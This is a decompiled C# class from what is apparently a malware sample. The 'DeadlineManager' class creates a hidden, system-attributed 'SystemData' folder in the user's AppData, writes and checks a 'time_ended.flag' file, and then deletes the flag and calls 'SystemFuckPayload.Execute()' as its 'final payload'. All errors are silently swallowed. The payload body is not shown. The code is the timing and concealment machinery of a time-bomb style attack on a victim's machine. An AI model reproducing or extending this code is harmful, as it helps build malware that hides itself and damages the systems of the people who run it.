using System;
using System.IO;

namespace ns0
{
	// Token: 0x02000017 RID: 23
	public static class DeadlineManager
	{
		// Token: 0x06000032 RID: 50 RVA: 0x00002844 File Offset: 0x00000A44
		public static void Initialize()
		{
			try
			{
				bool flag = !Directory.Exists(DeadlineManager.APPDATA_PATH);
				if (flag)
				{
					Directory.CreateDirectory(DeadlineManager.APPDATA_PATH);
					DirectoryInfo directoryInfo = new DirectoryInfo(DeadlineManager.APPDATA_PATH);
					directoryInfo.Attributes = FileAttributes.Hidden | FileAttributes.System;
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000033 RID: 51 RVA: 0x0000289C File Offset: 0x00000A9C
		public static void CreateTimeEndedFlag()
		{
			try
			{
				File.WriteAllText(DeadlineManager.FLAG_PATH, DateTime.Now.ToString());
			}
			catch
			{
			}
		}

		// Token: 0x06000034 RID: 52 RVA: 0x000028DC File Offset: 0x00000ADC
		public static bool IsTimeEnded()
		{
			bool flag;
			try
			{
				flag = File.Exists(DeadlineManager.FLAG_PATH);
			}
			catch
			{
				flag = false;
			}
			return flag;
		}

		// Token: 0x06000035 RID: 53 RVA: 0x00002910 File Offset: 0x00000B10
		public static void ExecuteFinalPayload()
		{
			try
			{
				try
				{
					bool flag = File.Exists(DeadlineManager.FLAG_PATH);
					if (flag)
					{
						File.Delete(DeadlineManager.FLAG_PATH);
					}
				}
				catch
				{
				}
				SystemFuckPayload.Execute();
			}
			catch
			{
			}
		}

		// Token: 0x04000012 RID: 18
		private static readonly string APPDATA_PATH = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "SystemData");

		// Token: 0x04000013 RID: 19
		private static readonly string FLAG_PATH = Path.Combine(DeadlineManager.APPDATA_PATH, "time_ended.flag");
	}
}
